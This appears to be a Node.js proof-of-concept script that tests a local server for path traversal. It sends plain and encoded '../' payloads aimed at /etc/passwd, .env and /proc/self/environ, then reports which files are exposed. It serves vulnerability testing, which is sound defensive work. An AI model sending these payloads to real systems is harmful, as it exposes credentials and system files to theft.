#!/usr/bin/env node

/**
 * Path Traversal Proof of Concept
 * This demonstrates the vulnerability in ultra-simple-server.js
 * 
 * WARNING: This is for educational/testing purposes only
 */

const http = require('http');

const serverUrl = 'http://localhost:8080';

// Attack vectors to test
const attackVectors = [
    '/css/../../../etc/passwd',
    '/js/../../../../etc/hosts',
    '/images/../../../.env',
    '/css/../package.json',
    '/js/../../../../../../proc/self/environ',
    '/css/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', // URL encoded
    '/css/..%2f..%2f..%2fetc%2fpasswd', // Partial encoding
    '/css/....//....//....//etc/passwd', // Double dots
    '/css/..//..//..//etc/passwd', // Double slashes
];

console.log('Path Traversal Vulnerability Test\n');
console.log('Testing server at:', serverUrl);
console.log('=' .repeat(50));

attackVectors.forEach((vector, index) => {
    setTimeout(() => {
        console.log(`\nTest ${index + 1}: ${vector}`);
        
        http.get(`${serverUrl}${vector}`, (res) => {
            let data = '';
            
            res.on('data', (chunk) => {
                data += chunk;
            });
            
            res.on('end', () => {
                console.log(`Status: ${res.statusCode}`);
                
                if (res.statusCode === 200) {
                    console.log('⚠️  VULNERABLE - File accessible!');
                    console.log('Response preview:', data.substring(0, 100) + '...');
                } else if (res.statusCode === 404) {
                    console.log('✓ File not found (might be safe or file doesn't exist)');
                } else if (res.statusCode === 403) {
                    console.log('✓ Access forbidden (properly protected)');
                } else {
                    console.log('Response:', res.statusCode);
                }
            });
        }).on('error', (err) => {
            console.log('Error:', err.message);
        });
    }, index * 1000); // Delay to avoid overwhelming the server
});

console.log('\nNote: This PoC assumes the server is running on localhost:8080');
console.log('Start the server with: node ultra-simple-server.js');